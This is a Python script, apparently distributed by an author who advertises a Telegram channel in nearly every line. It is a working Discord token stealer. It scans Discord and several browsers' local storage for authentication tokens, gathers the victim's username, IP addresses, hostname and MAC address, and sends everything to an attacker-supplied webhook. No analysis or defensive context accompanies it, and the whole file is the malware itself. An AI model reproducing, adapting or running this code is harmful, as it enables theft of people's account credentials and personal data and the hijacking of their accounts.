import os, re, json, socket, getpass, requests, getmac
from urllib.request import Request, urlopen
WEBHOOK_URL = '' #ВЕБХУК СЮДА
PING_ME = True #https://t.me/CDark_1
#https://t.me/CDark_1
def find_tokens(path): #https://t.me/CDark_1
	path += '\\Local Storage\\leveldb' #https://t.me/CDark_1 
	tokens = [] #https://t.me/CDark_1 
	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'): #https://t.me/CDark_1
			continue #https://t.me/CDark_1 
		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'): #https://t.me/CDark_1 
				for token in re.findall(regex, line):
					tokens.append(token) #https://t.me/CDark_1 
	return tokens
#https://t.me/CDark_1
def main():
	local = os.getenv('LOCALAPPDATA')
	roaming = os.getenv('APPDATA')
	paths = { #https://t.me/CDark_1 
		'Discord': roaming + '\\Discord',
		'Discord Canary': roaming + '\\discordcanary',
		'Discord PTB': roaming + '\\discordptb', #https://t.me/CDark_1 
		'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
		'OperaGX': roaming + '\\Opera Software\\Opera GX Stable',
		'Opera': roaming + '\\Opera Software\\Opera Stable',
		'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', #https://t.me/CDark_1
		'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default', #https://t.me/CDark_1
	}
	message = '@everyone' if PING_ME else '' #https://t.me/CDark_1
	for platform, path in paths.items():
		if not os.path.exists(path):
			continue #https://t.me/CDark_1 
		message += f'\n**{platform}**\n```\n' #https://t.me/CDark_1
		tokens = find_tokens(path)
		if len(tokens) > 0:
			for token in tokens:
				message += f'{token}\n'
		else: #https://t.me/CDark_1 
			message += 'No tokens found.\n' #https://t.me/CDark_1 
		message += '```'
	headers = {
		'Content-Type': 'application/json',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
	} #https://t.me/CDark_1
	hostname = socket.gethostname() #https://t.me/CDark_1
	IPAddr = socket.gethostbyname(hostname)
	ip = requests.get('https://api.ipify.org').text
	message += '```'
	message += "OS name: " + getpass.getuser() + "\n"
	message += "Public IP: " + ip + "\n" #https://t.me/CDark_1 
	message += "Host Name: " + hostname + "\n"
	message += "Internal IP: " + IPAddr + "\n"
	message += "Mac Address: " + getmac.get_mac_address() + "\n" #https://t.me/CDark_1 
	message += "CDark - https://t.me/CDark_1"
	message += '```' #https://t.me/CDark_1 
	payload = json.dumps({'content': message})
	try: #https://t.me/CDark_1
		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers) #https://t.me/CDark_1
		urlopen(req)
	except: #https://t.me/CDark_1
		pass #https://t.me/CDark_1 
if __name__ == '__main__':
	main() #https://t.me/CDark_1 